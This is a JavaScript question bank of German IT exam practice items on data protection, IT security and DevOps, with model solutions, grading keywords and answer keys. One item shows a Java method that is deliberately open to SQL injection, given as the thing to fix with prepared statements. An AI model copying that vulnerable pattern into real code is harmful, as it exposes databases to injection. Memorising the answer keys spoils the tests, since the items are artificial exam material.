    explanation: `Die klassischen Kontrollarten (Zutritt, Zugang, Zugriff, Weitergabe, Eingabe, Auftrag, Verfügbarkeit, Trennung) stammen aus dem alten BDSG, werden aber in der Prüfung weiterhin gern verwendet. Art. 32 DSGVO nennt Pseudonymisierung, Verschlüsselung, Vertraulichkeit, Integrität, Verfügbarkeit, Belastbarkeit und regelmäßige Überprüfung.`,
    keywords: ["zutritt", "zugang", "zugriff", "weitergabe|verschlüssel", "eingabe|protokoll", "verfügbarkeit|backup", "schulung|organisatorisch", "berechtigung|rolle"],
    tags: ["toms", "dsgvo"]
  },
  {
    id: "ga1-sicherheit-013", part: "GA1", topic: "ga1-sicherheit", type: "text", difficulty: 3, points: 8,
    context: `Die <b>Pflegedienst Sonnenschein GmbH</b> (120 Mitarbeitende) plant eine neue Webanwendung zur Tourenplanung und Pflegedokumentation. Gespeichert werden Diagnosen, Medikationspläne und Adressen der Patienten. Fällt das System aus, können die Pflegekräfte die Medikation vor Ort nicht einsehen; ein Ausfall von mehr als 4 Stunden gefährdet die Versorgung. Gleichzeitig wird eine interne Kantinen-App betrieben (Speiseplan, Vorbestellung).`,
    question: `Führen Sie für die beiden Anwendungen eine Schutzbedarfsfeststellung nach BSI IT-Grundschutz für die Schutzziele Vertraulichkeit, Integrität und Verfügbarkeit durch (Kategorien normal / hoch / sehr hoch) und begründen Sie Ihre Einstufung. Erläutern Sie außerdem das Maximumprinzip.`,
    solution: `<table>
<tr><th>Anwendung</th><th>Vertraulichkeit</th><th>Integrität</th><th>Verfügbarkeit</th></tr>
<tr><td><b>Pflegedokumentation</b></td>
<td><b>sehr hoch</b> – Gesundheitsdaten (Art. 9 DSGVO), Offenlegung schadet Patienten erheblich, hohe Bußgelder/Reputationsschaden</td>
<td><b>sehr hoch</b> – falsche Medikationsangaben können Leib und Leben gefährden</td>
<td><b>hoch</b> (vertretbar auch sehr hoch) – Ausfall &gt; 4 h gefährdet die Versorgung; Überbrückung mit Notfallausdrucken denkbar</td></tr>
<tr><td><b>Kantinen-App</b></td>
<td><b>normal</b> – kaum personenbezogene Daten (ggf. Bestellungen)</td>
<td><b>normal</b> – fehlerhafte Speisepläne mit geringem Schaden (Ausnahme: Allergenangaben → ggf. hoch)</td>
<td><b>normal</b> – Ausfall ist tolerierbar</td></tr>
</table>
<b>Maximumprinzip:</b> Der Schutzbedarf eines Zielobjekts (z.&nbsp;B. Server, Netzwerk) richtet sich nach dem <b>höchsten</b> Schutzbedarf der darauf betriebenen Anwendungen. Laufen beide Anwendungen auf demselben Server, erhält der Server für Vertraulichkeit und Integrität „sehr hoch“.<br>
Ergänzend: <b>Kumulationseffekt</b> (viele kleine Schäden summieren sich zu höherem Schutzbedarf), <b>Verteilungseffekt</b> (bei redundanter Verteilung kann der Schutzbedarf eines Einzelsystems sinken).`,
    explanation: `Bewertet werden die nachvollziehbare Begründung über Schadensszenarien (Gesetzesverstöße, Gefahr für Leib und Leben, finanzielle Auswirkungen, Ansehen) und das Maximumprinzip. Abweichende Einstufungen sind mit schlüssiger Begründung akzeptabel.`,
    keywords: ["vertraulichkeit", "integrität|integritaet", "verfügbarkeit|verfuegbarkeit", "sehr hoch", "normal", "gesundheitsdaten|art. 9|diagnose", "maximumprinzip|maximum", "kumulation|verteilung", "schaden"],
    tags: ["bsi", "schutzbedarf"]
  },
  {
    id: "ga1-sicherheit-014", part: "GA1", topic: "ga1-sicherheit", type: "text", difficulty: 1, points: 4,
    question: `Grenzen Sie <b>Authentifizierung</b> und <b>Autorisierung</b> voneinander ab. Erläutern Sie außerdem, was eine Multi-Faktor-Authentifizierung (MFA) ist, und nennen Sie die drei Faktorkategorien mit je einem Beispiel.`,
    solution: `<ul><li><b>Authentifizierung</b>: Nachweis bzw. Überprüfung der Identität („Wer bist du?“), z.&nbsp;B. Login mit Benutzername und Passwort.</li>
<li><b>Autorisierung</b>: Prüfung und Vergabe von Rechten nach erfolgreicher Authentifizierung („Was darfst du?“), z.&nbsp;B. nur Rolle „Buchhaltung“ darf Rechnungen freigeben.</li></ul>
<b>MFA</b>: Die Anmeldung erfordert mindestens zwei voneinander unabhängige Faktoren aus <b>unterschiedlichen</b> Kategorien:
<ul><li><b>Wissen</b>: Passwort, PIN, Sicherheitsfrage</li>
<li><b>Besitz</b>: Smartphone mit Authenticator-App (TOTP), Hardware-Token (FIDO2/YubiKey), Chipkarte</li>
<li><b>Inhärenz/Sein</b>: Fingerabdruck, Gesichtserkennung, Iris</li></ul>
Passwort + Sicherheitsfrage ist <i>keine</i> MFA, da beide zur Kategorie Wissen gehören.`,
    explanation: `Häufige Verwechslung. Merkhilfe: Authentifizierung kommt immer zuerst.`,
    keywords: ["identität|identitaet|wer", "rechte|berechtigung|darf", "wissen|passwort", "besitz|token|smartphone", "biometr|fingerabdruck|inhärenz|sein", "unterschiedlich|verschieden|zwei"],
    tags: ["authentifizierung", "mfa"]
  },
  {
    id: "ga1-sicherheit-015", part: "GA1", topic: "ga1-sicherheit", type: "code", difficulty: 2, points: 6, lang: "java",
    context: `Folgende Methode ist anfällig für SQL-Injection:
<pre><code>public List&lt;Kunde&gt; sucheKunden(String nachname, String ort) throws SQLException {
    String sql = "SELECT id, vorname, nachname FROM kunde WHERE nachname = '"
               + nachname + "' AND ort = '" + ort + "'";
    Statement st = connection.createStatement();
    ResultSet rs = st.executeQuery(sql);
    ...
}</code></pre>`,
    question: `Schreiben Sie die Methode so um, dass sie gegen SQL-Injection geschützt ist (Java mit JDBC oder Pseudocode).`,
    solution: `<pre><code>public List&lt;Kunde&gt; sucheKunden(String nachname, String ort) throws SQLException {
    String sql = "SELECT id, vorname, nachname FROM kunde "
               + "WHERE nachname = ? AND ort = ?";
    List&lt;Kunde&gt; ergebnis = new ArrayList&lt;&gt;();
    try (PreparedStatement ps = connection.prepareStatement(sql)) {
        ps.setString(1, nachname);        // Parameter werden getrennt übertragen
        ps.setString(2, ort);
        try (ResultSet rs = ps.executeQuery()) {
            while (rs.next()) {
                ergebnis.add(new Kunde(rs.getInt("id"),
                                       rs.getString("vorname"),
                                       rs.getString("nachname")));
            }
        }
    }
    return ergebnis;
}</code></pre>
Die SQL-Struktur wird mit Platzhaltern <code>?</code> vorab an die Datenbank übergeben; die Benutzereingaben werden nur noch als <b>Daten</b> gebunden und können die Abfrage nicht mehr verändern.`,
    explanation: `Fehler: Platzhalter in Anführungszeichen setzen (<code>'?'</code>) oder den String trotzdem zusammenbauen und nur <code>prepareStatement</code> aufrufen. try-with-resources schließt Statement/ResultSet sauber.`,
    keywords: ["preparedstatement|prepared statement|preparestatement", "?", "setstring", "executequery", "resultset|rs.next", "try"],
    tags: ["sql-injection", "code"]
  },
  {
    id: "ga1-sicherheit-016", part: "GA1", topic: "ga1-sicherheit", type: "code", difficulty: 3, points: 8, lang: "pseudocode",
    context: `Für das Ticketsystem der <b>Stadtverwaltung Neustadt</b> sollen Berechtigungen rollenbasiert (RBAC) vergeben werden. Rollen: <b>Bürger</b>, <b>Sachbearbeiter</b>, <b>Teamleiter</b>, <b>Administrator</b>. Objekte/Funktionen: eigene Tickets anlegen/lesen, alle Tickets lesen, Tickets bearbeiten, Tickets einem Sachbearbeiter zuweisen, Tickets löschen, Benutzer und Rollen verwalten, Auswertungen ansehen. Es gilt das Prinzip der minimalen Rechte; Administratoren sollen keine fachlichen Ticketinhalte bearbeiten.`,
    question: `Erstellen Sie eine Berechtigungsmatrix (Rollen × Funktionen) und begründen Sie zwei Ihrer Entscheidungen. Beschreiben Sie außerdem, wie die Prüfung technisch in der Anwendung umgesetzt werden sollte.`,
    solution: `<pre>Funktion                     | Bürger | Sachbearb. | Teamleiter | Admin
-----------------------------+--------+------------+------------+------
Eigene Tickets anlegen/lesen |   X    |     X      |     X      |
Alle Tickets lesen           |        |     X      |     X      |
Tickets bearbeiten           |        |     X      |     X      |
Tickets zuweisen             |        |            |     X      |
Tickets löschen              |        |            |     X      |
Auswertungen ansehen         |        |            |     X      |
Benutzer/Rollen verwalten    |        |            |            |  X</pre>
<b>Begründungen:</b>
<ul><li>Bürger sehen nur ihre eigenen Tickets (Need-to-know, Datenschutz anderer Bürger).</li>
<li>Löschen nur durch Teamleiter (Vier-Augen-/Verantwortungsprinzip, Revisionssicherheit – besser: nur „archivieren“).</li>
<li>Administrator verwaltet nur Benutzer/Rollen, kein Zugriff auf Inhalte (Funktionstrennung, Least Privilege).</li></ul>
<b>Technische Umsetzung:</b> Rechteprüfung <b>serverseitig</b> bei jeder Anfrage (nicht nur Buttons im Frontend ausblenden), z.&nbsp;B. über Annotationen/Middleware <code>@RolesAllowed("TEAMLEITER")</code>; zusätzlich Objektprüfung („gehört Ticket 4711 dem angemeldeten Bürger?“) gegen Broken Access Control/IDOR; deny by default; Rollen in der DB (Benutzer n:m Rolle, Rolle n:m Recht); Protokollierung von Rechteänderungen.`,
    explanation: `Häufigster Fehler in der Praxis (OWASP A01): Rechte nur in der Oberfläche prüfen. Abweichende Matrizen sind mit Begründung zulässig.`,
    keywords: ["bürger|buerger", "sachbearbeiter", "teamleiter", "admin", "least privilege|minimale rechte|minimal", "need-to-know|eigene", "serverseitig|backend|server", "rolle"],
    tags: ["rbac", "berechtigung"]
  },
  {
    id: "ga1-sicherheit-017", part: "GA1", topic: "ga1-sicherheit", type: "code", difficulty: 3, points: 8, lang: "pseudocode",
    context: `Für die Benutzerverwaltung einer Webanwendung sollen Registrierung und Login implementiert werden. Zur Verfügung stehen die Bibliotheksfunktionen <code>argon2Hash(passwort) : String</code> (erzeugt intern ein Salt und gibt einen String mit Parametern, Salt und Hash zurück) und <code>argon2Verify(hashString, passwort) : Boolean</code>. Nach 5 Fehlversuchen soll das Konto für 15 Minuten gesperrt werden.`,
    question: `Entwickeln Sie in Pseudocode die Funktionen <code>registrieren(email, passwort)</code> und <code>login(email, passwort)</code>. Berücksichtigen Sie eine Passwortrichtlinie (min. 12 Zeichen), die sichere Speicherung, die Sperrlogik und datensparsame Fehlermeldungen.`,
    solution: `<pre>FUNKTION registrieren(email, passwort)
    WENN LAENGE(passwort) &lt; 12 DANN
        RÜCKGABE "Passwort muss mindestens 12 Zeichen haben"
    ENDE WENN
    WENN db.benutzerExistiert(email) DANN
        RÜCKGABE "Registrierung nicht möglich"     // keine Info, ob E-Mail existiert
    ENDE WENN
    hash ← argon2Hash(passwort)                     // Salt ist im hash enthalten
    db.speichere(email, hash, fehlversuche = 0, gesperrtBis = NULL)
    RÜCKGABE "OK"
ENDE FUNKTION

FUNKTION login(email, passwort)
    benutzer ← db.ladeBenutzer(email)
    WENN benutzer = NULL DANN
        RÜCKGABE "E-Mail oder Passwort falsch"
    ENDE WENN
    WENN benutzer.gesperrtBis ≠ NULL UND jetzt() &lt; benutzer.gesperrtBis DANN
        RÜCKGABE "Konto vorübergehend gesperrt"
    ENDE WENN
    WENN argon2Verify(benutzer.hash, passwort) DANN
        benutzer.fehlversuche ← 0
        db.aktualisiere(benutzer)
        log("Login erfolgreich", benutzer.id)       // kein Passwort loggen!
        RÜCKGABE neueSession(benutzer)
    SONST
        benutzer.fehlversuche ← benutzer.fehlversuche + 1
        WENN benutzer.fehlversuche &gt;= 5 DANN
            benutzer.gesperrtBis ← jetzt() + 15 Minuten
            benutzer.fehlversuche ← 0
        ENDE WENN
        db.aktualisiere(benutzer)
        log("Login fehlgeschlagen", benutzer.id)
        RÜCKGABE "E-Mail oder Passwort falsch"
    ENDE WENN
ENDE FUNKTION</pre>`,
    explanation: `Bewertungspunkte: Passwort nie im Klartext speichern/loggen, Verifikation über die Bibliotheksfunktion (kein eigenes Vergleichen mit erneutem Hash ohne Salt), Zähler und Sperrzeit, einheitliche Fehlermeldung (verhindert User Enumeration), Zähler-Reset bei Erfolg. Zusätzlich sinnvoll: Abgleich mit Listen kompromittierter Passwörter, MFA, Rate Limiting pro IP.`,
    keywords: ["argon2hash", "argon2verify", "12", "fehlversuche", "15", "gesperrt", "e-mail oder passwort falsch|einheitlich|allgemein", "wenn|if"],
    tags: ["passwort", "pseudocode"]
  },
  {
    id: "ga1-sicherheit-018", part: "GA1", topic: "ga1-sicherheit", type: "code", difficulty: 2, points: 6, lang: "pseudocode",
    context: `Ein Penetrationstest der Webanwendung eines Onlineshops bemängelt: Session-Cookie ohne Schutzattribute, kein Schutz gegen das Einbetten der Seite in fremde Frames (Clickjacking), keine HTTPS-Erzwingung, Skripte von beliebigen Quellen ausführbar.`,
    question: `Formulieren Sie die HTTP-Response-Header, mit denen die Mängel behoben werden, und erläutern Sie jeden Header kurz.`,
    solution: `<pre>Set-Cookie: SESSIONID=8f3a...; Secure; HttpOnly; SameSite=Strict; Path=/
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'none'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff</pre>
<ul><li><b>Secure</b>: Cookie nur über HTTPS; <b>HttpOnly</b>: kein Zugriff per JavaScript (XSS-Schutz für die Session); <b>SameSite=Strict</b>: Cookie wird bei Cross-Site-Anfragen nicht mitgesendet (CSRF-Schutz).</li>
<li><b>Strict-Transport-Security (HSTS)</b>: Browser nutzt für 1 Jahr ausschließlich HTTPS.</li>
<li><b>Content-Security-Policy</b>: Skripte/Ressourcen nur von der eigenen Domain; <code>frame-ancestors 'none'</code> verbietet Einbetten.</li>
<li><b>X-Frame-Options: DENY</b>: älterer Clickjacking-Schutz für ältere Browser.</li>
<li><b>X-Content-Type-Options: nosniff</b>: verhindert MIME-Sniffing.</li></ul>`,
    explanation: `HSTS wirkt erst nach dem ersten HTTPS-Besuch; zusätzlich sollte HTTP per 301 auf HTTPS umgeleitet werden.`,
    keywords: ["secure", "httponly", "samesite", "strict-transport-security|hsts", "content-security-policy|csp", "x-frame-options|frame-ancestors", "nosniff", "set-cookie"],
    tags: ["web", "header"]
  },
  {
    id: "ga1-sicherheit-019", part: "GA1", topic: "ga1-sicherheit", type: "order", difficulty: 3, points: 4,
    question: `Bringen Sie die Schritte eines vereinfachten TLS-Verbindungsaufbaus (TLS 1.2 mit Schlüsselaustausch über ECDHE) in die richtige Reihenfolge.`,
    items: [
      `Client Hello: Client sendet unterstützte TLS-Versionen, Cipher Suites und eine Zufallszahl`,
      `Server Hello: Server wählt Version und Cipher Suite und sendet eine Zufallszahl`,
      `Server sendet sein X.509-Zertifikat und seine signierten ECDHE-Parameter`,
      `Client prüft das Zertifikat (Signatur der CA, Gültigkeit, Hostname)`,
      `Client sendet seinen ECDHE-Anteil; beide berechnen den gemeinsamen Sitzungsschlüssel`,
      `Beide senden „Finished“-Nachrichten, die bereits verschlüsselt sind`,
      `Verschlüsselte Übertragung der Anwendungsdaten (HTTP) mit symmetrischem Verfahren (z. B. AES-GCM)`
    ],
    solution: `Client Hello → Server Hello → Zertifikat + Schlüsselparameter → Zertifikatsprüfung durch Client → Schlüsselaustausch / Berechnung Sitzungsschlüssel → Finished → symmetrisch verschlüsselte Nutzdaten.`,
    explanation: `TLS ist ein hybrides Verfahren: asymmetrisch für Authentifizierung/Schlüsselaustausch, symmetrisch für die Daten. TLS 1.3 verkürzt den Handshake auf einen Round Trip.`,
    tags: ["tls"]
  },
  {
    id: "ga1-sicherheit-020", part: "GA1", topic: "ga1-sicherheit", type: "numeric", difficulty: 2, points: 3,
    context: `In einem Projektteam sollen 12 Personen paarweise vertraulich miteinander kommunizieren können.`,
    question: `Wie viele Schlüssel werden bei einem rein <b>symmetrischen</b> Verfahren insgesamt benötigt?`,
    answer: 66, tolerance: 0, unit: "Schlüssel",
    solution: `Jedes Paar benötigt einen eigenen geheimen Schlüssel: n · (n − 1) / 2 = 12 · 11 / 2 = <b>66</b> Schlüssel.<br>Zum Vergleich asymmetrisch: 2 · n = 24 Schlüssel (12 Schlüsselpaare).`,
    explanation: `Das quadratische Wachstum der Schlüsselanzahl ist neben dem sicheren Austausch der Hauptnachteil symmetrischer Verfahren.`,
    tags: ["kryptografie"]
  },
  {
    id: "ga1-sicherheit-021", part: "GA1", topic: "ga1-sicherheit", type: "numeric", difficulty: 2, points: 3,
    context: `Ein Onlinehändler mit einem weltweiten Jahresumsatz von 750 Mio. € verstößt schwerwiegend gegen die Grundsätze der Verarbeitung (Art. 5 DSGVO).`,
    question: `Wie hoch ist das <b>maximal mögliche</b> Bußgeld nach Art. 83 Abs. 5 DSGVO in Mio. €?`,
    answer: 30, tolerance: 0, unit: "Mio. €",
    solution: `Höchstbetrag: bis zu 20 Mio. € <b>oder</b> bis zu 4 % des weltweiten Jahresumsatzes des vorangegangenen Geschäftsjahres – <b>je nachdem, welcher Betrag höher ist</b>.<br>4 % × 750 Mio. € = 30 Mio. € &gt; 20 Mio. € → maximal <b>30 Mio. €</b>.`,
    explanation: `Für weniger schwere Verstöße (Art. 83 Abs. 4, z.&nbsp;B. fehlende TOMs) gilt 10 Mio. € bzw. 2 %. Die tatsächliche Höhe richtet sich nach Schwere, Dauer, Vorsatz, Kooperation usw.`,
    tags: ["dsgvo", "bussgeld"]
  }
);

// ===================== ga1-devops =====================
AP2.questions.push(
  {
    id: "ga1-devops-001", part: "GA1", topic: "ga1-devops", type: "mc", difficulty: 1, points: 2,
    question: `Was bewirkt der Befehl <code>git pull</code> standardmäßig?`,
    options: [
      `Er überträgt lokale Commits in das Remote-Repository.`,
      `Er lädt Änderungen vom Remote-Repository herunter und führt sie mit dem aktuellen lokalen Branch zusammen (fetch + merge).`,
      `Er lädt Änderungen herunter, ohne den lokalen Branch zu verändern.`,
      `Er erstellt eine lokale Kopie eines entfernten Repositorys.`
    ],
    correct: [1],
    solution: `<code>git pull</code> = <code>git fetch</code> + <code>git merge</code> (bzw. mit <code>--rebase</code> fetch + rebase). Antwort A beschreibt <code>git push</code>, C <code>git fetch</code>, D <code>git clone</code>.`,
    explanation: `Vor einem Pull sollten lokale Änderungen committet oder per <code>git stash</code> zwischengespeichert werden, um Konflikte mit dem Arbeitsverzeichnis zu vermeiden.`,
    tags: ["git"]
  },
  {
    id: "ga1-devops-002", part: "GA1", topic: "ga1-devops", type: "mc", difficulty: 2, points: 2,
    context: `Ein Streamingdienst rollt eine neue Version seines Empfehlungsdienstes aus. Zunächst erhalten 5 % der Nutzer die neue Version. Fehlerrate und Antwortzeiten werden beobachtet; sind sie unauffällig, wird der Anteil schrittweise auf 25 %, 50 % und 100 % erhöht.`,
    question: `Um welche Deployment-Strategie handelt es sich?`,
    options: [`Blue-Green-Deployment`, `Big-Bang-Deployment`, `Canary-Release`, `Rolling Update`],
    correct: [2],
    solution: `<b>Canary-Release</b>: Die neue Version wird zunächst einem kleinen Nutzeranteil („Kanarienvogel“) bereitgestellt; bei guten Metriken wird schrittweise erweitert, bei Problemen sofort zurückgerollt.`,
    explanation: `Blue-Green schaltet den gesamten Verkehr auf einmal zwischen zwei Umgebungen um. Rolling Updates tauschen Instanzen nacheinander aus – ohne gezielte Steuerung des Nutzeranteils.`,
    tags: ["deployment"]
  },
  {
    id: "ga1-devops-003", part: "GA1", topic: "ga1-devops", type: "mc", difficulty: 2, points: 2,
    context: `Die <b>DataSoft GmbH</b> möchte ein proprietäres Desktop-Programm an Kunden <b>verkaufen</b> und dafür eine Bibliothek verwenden, die unter der <b>GPL v3</b> steht. Die Bibliothek wird fest in das Programm einkompiliert.`,
    question: `Welche Aussage ist korrekt?`,
    options: [
      `Das ist problemlos möglich, da Open-Source-Software immer frei verwendet werden darf.`,
      `Das Gesamtprogramm muss bei Weitergabe ebenfalls unter der GPL lizenziert und der Quellcode den Kunden zugänglich gemacht werden.`,
      `Es genügt, im Handbuch auf die Bibliothek hinzuweisen.`,
      `Die GPL verbietet grundsätzlich den Verkauf von Software.`
    ],
    correct: [1],
    solution: `Die GPL hat ein <b>starkes Copyleft</b>: Abgeleitete Werke, die weitergegeben werden, müssen ebenfalls unter der GPL stehen, inkl. Bereitstellung des Quellcodes. Ein proprietärer Vertrieb ist so nicht möglich. Alternativen: Bibliothek unter MIT/Apache/LGPL suchen, kommerzielle Lizenz des Herstellers erwerben (Dual Licensing).`,
    explanation: `Die GPL erlaubt den Verkauf durchaus (Antwort D falsch) – nur der Quellcode muss mitgeliefert werden. Ein Hinweis allein reicht bei permissiven Lizenzen wie MIT (dort Lizenztext beifügen), nicht bei GPL.`,
    tags: ["lizenzen", "gpl"]
  },
  {
    id: "ga1-devops-004", part: "GA1", topic: "ga1-devops", type: "mc", difficulty: 1, points: 2,
    context: `Ein Entwicklerteam möchte seine Java-Webanwendung in der Cloud betreiben, ohne sich um Betriebssystem-Updates, Laufzeitumgebung und Serverkonfiguration kümmern zu müssen. Es soll nur das Anwendungsartefakt hochgeladen werden.`,
    question: `Welches Cloud-Servicemodell passt?`,
    options: [`IaaS`, `PaaS`, `SaaS`, `On-Premises`],
    correct: [1],
    solution: `<b>PaaS (Platform as a Service)</b>: Der Anbieter stellt Infrastruktur, Betriebssystem und Laufzeitumgebung bereit (z.&nbsp;B. Azure App Service, Heroku, AWS Elastic Beanstalk); der Kunde verantwortet nur Anwendung und Daten.`,
    explanation: `Bei IaaS müsste das Team die VMs inkl. OS selbst verwalten; SaaS ist eine fertige Anwendung (z.&nbsp;B. Microsoft 365) – dort wird keine eigene Software betrieben.`,
    tags: ["cloud"]
  },
  {
    id: "ga1-devops-005", part: "GA1", topic: "ga1-devops", type: "multi", difficulty: 2, points: 4,
    question: `Welche Aussagen zum Vergleich von Containern (z.&nbsp;B. Docker) und virtuellen Maschinen sind korrekt? (Mehrfachauswahl)`,
    options: [
      `Container teilen sich den Kernel des Host-Betriebssystems.`,
      `Jede virtuelle Maschine enthält ein vollständiges Gast-Betriebssystem.`,
      `Container starten in der Regel deutlich schneller als VMs.`,
      `Container bieten grundsätzlich eine stärkere Isolation als VMs.`,
      `Ein Docker-Image ist eine unveränderliche Vorlage, aus der beliebig viele Container gestartet werden können.`,
      `Auf einem Linux-Host können Linux-Container und Windows-Container ohne Virtualisierung gleichermaßen nativ laufen.`
    ],
    correct: [0, 1, 2, 4],
    solution: `Richtig: gemeinsamer Kernel, VM mit eigenem Gast-OS über Hypervisor, schneller Start (Sekunden statt Minuten), Image als Vorlage für Container.<br>Falsch: VMs isolieren stärker (eigener Kernel, Hardwarevirtualisierung). Da Container den Host-Kernel nutzen, laufen Windows-Container nicht nativ auf einem Linux-Kernel.`,
    explanation: `Vorteile von Containern: geringer Ressourcenbedarf, hohe Dichte, identische Umgebung von Entwicklung bis Produktion („works on my machine“-Problem gelöst), ideal für Microservices und CI/CD.`,
    tags: ["container", "docker"]
  },
  {
    id: "ga1-devops-006", part: "GA1", topic: "ga1-devops", type: "multi", difficulty: 3, points: 4,
    question: `Welche Aussagen zu <code>git merge</code> und <code>git rebase</code> sind korrekt? (Mehrfachauswahl)`,
    options: [
      `Ein Merge (ohne Fast-Forward) erzeugt einen Merge-Commit mit zwei Eltern-Commits.`,
      `Ein Rebase schreibt die Historie um, indem Commits mit neuen Hashes auf eine neue Basis gesetzt werden.`,
      `Ein Rebase von bereits gepushten, gemeinsam genutzten Branches ist unproblematisch.`,
      `Ein Rebase führt zu einer linearen Historie.`,
      `Ein Fast-Forward-Merge ist möglich, wenn der Zielbranch seit der Abzweigung keine neuen Commits erhalten hat.`,
      `Bei einem Rebase können keine Konflikte auftreten.`
    ],
    correct: [0, 1, 3, 4],
    solution: `Richtig: Merge-Commit mit zwei Eltern; Rebase erzeugt neue Commits (neue Hashes) → lineare Historie; Fast-Forward, wenn der Zielbranch nur „nachgezogen“ werden muss.<br>Falsch: Rebase gemeinsam genutzter Branches zwingt andere zu Force-Pulls und kann Arbeit überschreiben („Golden Rule of Rebasing“). Konflikte können bei jedem neu angewendeten Commit auftreten (<code>git rebase --continue</code>).`,
    explanation: `Faustregel: lokale Feature-Branches vor dem PR per Rebase aktualisieren, gemeinsame Branches (main, develop) per Merge zusammenführen.`,
    tags: ["git", "merge", "rebase"]
  },
  {
    id: "ga1-devops-007", part: "GA1", topic: "ga1-devops", type: "multi", difficulty: 1, points: 3,
    question: `Welche Inhalte gehören typischerweise in die <b>Betriebs- bzw. Administratorendokumentation</b>? (Mehrfachauswahl)`,
    options: [
      `Installations- und Konfigurationsanleitung für den Server`,
      `Schritt-für-Schritt-Anleitung „Wie lege ich einen neuen Auftrag an?“ für Sachbearbeiter`,
      `Backup- und Wiederherstellungsverfahren`,
      `Klassendiagramme und Beschreibung der internen API`,
      `Notfallhandbuch mit Ansprechpartnern und Wiederanlaufplan`,
      `Systemvoraussetzungen, Ports, Firewall-Regeln, Monitoring-Hinweise`
    ],
    correct: [0, 2, 4, 5],
    solution: `Betriebsdoku: Installation, Konfiguration, Systemvoraussetzungen, Backup/Restore, Monitoring, Notfallhandbuch.<br>Die Bedienanleitung für Sachbearbeiter ist <b>Benutzerdokumentation</b>; Klassendiagramme und API-Beschreibung gehören zur <b>Entwickler-/Systemdokumentation</b>.`,
    explanation: `Dokumentation zielgruppengerecht trennen: Anwender, Administratoren, Entwickler.`,
    tags: ["dokumentation"]
  },
  {
    id: "ga1-devops-008", part: "GA1", topic: "ga1-devops", type: "text", difficulty: 2, points: 6,
    context: `Das fünfköpfige Entwicklerteam der <b>Logistik Rheinland GmbH</b> integriert Änderungen bisher einmal im Monat manuell; das Deployment erfolgt per FTP-Upload am Wochenende. Häufig treten nach dem Deployment Fehler auf.`,
    question: `Erläutern Sie die Begriffe Continuous Integration, Continuous Delivery und Continuous Deployment und beschreiben Sie, wie eine CI/CD-Pipeline die genannten Probleme verringert.`,
    solution: `<ul><li><b>Continuous Integration (CI)</b>: Entwickler integrieren ihre Änderungen mehrmals täglich in den gemeinsamen Hauptzweig. Jeder Push löst automatisch Build, Unit-Tests und statische Codeanalyse aus. Fehler werden früh und klein entdeckt.</li>
<li><b>Continuous Delivery</b>: Erweiterung von CI; jede erfolgreich getestete Version wird automatisch als auslieferbares Artefakt bereitgestellt und auf Test-/Staging-Umgebungen deployt. Das Produktiv-Deployment erfolgt per Knopfdruck (manuelle Freigabe).</li>
<li><b>Continuous Deployment</b>: Jede Änderung, die alle Pipeline-Stufen besteht, geht <b>automatisch</b> in Produktion – ohne manuellen Schritt.</li></ul>
<b>Nutzen im Fall:</b> kleine, häufige Änderungen statt großer monatlicher Integration (weniger Merge-Konflikte); automatisierte Tests verhindern, dass fehlerhafte Versionen ausgeliefert werden; reproduzierbares, automatisiertes Deployment statt fehleranfälligem manuellem FTP-Upload; schnelles Feedback und Rollback; Deployments auch unter der Woche ohne Wochenendarbeit.`,
    explanation: `Häufiger Fehler: Delivery und Deployment gleichsetzen. Unterschied = manuelle Freigabe für Produktion.`,
    keywords: ["continuous integration|ci", "continuous delivery", "continuous deployment", "automatisch|automatisiert", "build", "test", "freigabe|manuell", "artefakt", "früh|schnelles feedback|fehler früh"],
    tags: ["ci-cd"]
  },
  {
    id: "ga1-devops-009", part: "GA1", topic: "ga1-devops", type: "text", difficulty: 3, points: 8,
    context: `Die <b>Bäckerei-Kette Goldkorn</b> (24 Filialen) führt ein neues Kassen- und Warenwirtschaftssystem ein, das das 15 Jahre alte System ablöst. Die Filialen dürfen nicht länger als einen halben Tag ausfallen; das Weihnachtsgeschäft beginnt in sechs Wochen. Die IT-Abteilung besteht aus drei Personen.`,
    question: `Beschreiben Sie drei Einführungsstrategien mit je einem Vor- und Nachteil und geben Sie eine begründete Empfehlung für Goldkorn.`,
    solution: `<ul><li><b>Big Bang (Stichtagsumstellung)</b>: Alle Filialen wechseln zu einem Stichtag. + schnell, keine Schnittstellen zwischen Alt- und Neusystem, geringere Kosten. – hohes Risiko: Fehler betreffen alle 24 Filialen gleichzeitig; hohe Last für das kleine IT-Team.</li>
<li><b>Parallelbetrieb</b>: Alt- und Neusystem laufen eine Zeit lang gleichzeitig. + hohe Sicherheit, Rückfallmöglichkeit, Ergebnisse vergleichbar. – doppelter Erfassungsaufwand für das Personal, an einer Kasse kaum praktikabel, hohe Kosten.</li>
<li><b>Stufenweise / Pilotbetrieb</b>: Zunächst eine oder wenige Pilotfilialen, danach Filiale für Filiale (bzw. Modul für Modul). + Risiko begrenzt, Erfahrungen aus dem Pilot fließen ein, IT-Team kann jede Filiale betreuen. – längere Gesamtdauer, Alt- und Neusystem müssen zeitweise zusammenarbeiten (Schnittstelle zur Zentrale).</li></ul>
<b>Empfehlung:</b> Pilotbetrieb in 1–2 Filialen und anschließend stufenweise Einführung in Gruppen – aber <b>erst nach dem Weihnachtsgeschäft</b> (z.&nbsp;B. ab Januar) oder Pilot jetzt und Rollout im Januar. Begründung: geringes Ausfallrisiko (max. ½ Tag je Filiale), kleines IT-Team kann Filialen nacheinander betreuen, kritisches Weihnachtsgeschäft wird nicht gefährdet. Big Bang wäre wegen des Risikos, Parallelbetrieb wegen des doppelten Aufwands an der Kasse ungeeignet.`,
    explanation: `Die IHK erwartet Bezug zur Situation: Zeitdruck, Ausfalltoleranz, Personalkapazität. Ohne Begründung keine volle Punktzahl für die Empfehlung.`,
    keywords: ["big bang|stichtag", "parallel", "stufenweise|schrittweise|phasenweise", "pilot", "risiko", "aufwand|kosten", "weihnacht", "empfehl"],
    tags: ["einfuehrung"]
  },
  {
    id: "ga1-devops-010", part: "GA1", topic: "ga1-devops", type: "text", difficulty: 2, points: 5,
    context: `Beim Zusammenführen des Branches <code>feature/rabatt</code> in <code>main</code> meldet Git:
<pre>Auto-merging src/Preis.java
CONFLICT (content): Merge conflict in src/Preis.java
Automatic merge failed; fix conflicts and then commit the result.</pre>`,
    question: `Erläutern Sie, wie dieser Konflikt entsteht, wie er in der Datei dargestellt wird und welche Schritte zur Auflösung notwendig sind. Nennen Sie zwei Maßnahmen, um Konflikte zu reduzieren.`,
